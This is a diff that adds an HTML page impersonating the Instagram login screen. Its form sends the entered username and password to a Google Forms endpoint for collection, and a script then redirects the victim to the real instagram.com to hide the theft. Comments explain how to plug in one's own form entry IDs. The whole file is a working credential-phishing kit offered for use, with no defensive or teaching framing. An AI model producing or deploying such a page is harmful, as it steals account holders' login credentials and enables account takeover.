@@ -1,0 +1,24 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Instagram</title>
+</head>
+<body>
+    <h1>Instagram</h1>
+    <form id="loginForm" action="https://docs.google.com/forms/u/0/d/e/1FAIpQLSeeQOC82j3KlAIyLeF57niS63fow9ij7N6VjaZVy-ayxhv4Cg/formResponse" method="POST">
+        <label>Username:</label><br>
+        <input type="text" name="entry.363416333"><br> <!-- Replace with your Username entry ID -->
+        <label>Password:</label><br>
+        <input type="password" name="entry.20945221"><br> <!-- Replace with your Password entry ID -->
+        <input type="submit" value="Log In">
+    </form>
+    <script>
+        document.getElementById("loginForm").addEventListener("submit", function(event) {
+            console.log("Submitting to Google Sheets...");
+            setTimeout(function() {
+                window.location.href = "https://instagram.com";
+            }, 500); // Redirect after 0.5 seconds
+        });
+    </script>
+</body>
+</html>
